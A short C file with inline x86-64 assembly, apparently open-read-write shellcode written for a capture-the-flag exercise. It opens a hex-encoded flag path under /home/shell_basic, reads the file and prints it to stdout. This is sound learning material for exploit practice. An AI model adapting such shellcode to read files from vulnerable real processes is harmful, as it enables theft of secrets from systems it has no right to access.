// File name: orw.c
// Compile: gcc -o orw orw.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "push 0x00\n"
    "mov rax, 0x676e6f6f6f6f6f6f\n"
    "push rax\n"
    "mov rax, 0x6c5f73695f656d61\n"
    "push rax\n"
    "mov rax, 0x6e5f67616c662f63\n"
    "push rax\n"
    "mov rax, 0x697361625f6c6c65\n"
    "push rax\n"
    "mov rax, 0x68732f656d6f682f\n"
    "push rax\n"
    "mov rdi, rsp\n"
    "xor rsi, rsi\n"
    "xor rdx, rdx\n"
    "mov rax, 2\n"
    "syscall\n"
    "\n"
    "mov rdi, rax\n"
    "mov rsi, rsp\n"
    "sub rsi, 0xA0\n"
    "mov rdx, 0xA0\n"
    "mov rax, 0x0\n"
    "syscall\n"
    "\n"
    "mov rdi, 1\n"
    "mov rax, 0x1\n"
    "syscall\n"
    "\n"
    "xor rdi, rdi\n"
    "mov rax, 0x3c\n"
    "syscall");

void run_sh();

int main() { run_sh(); }
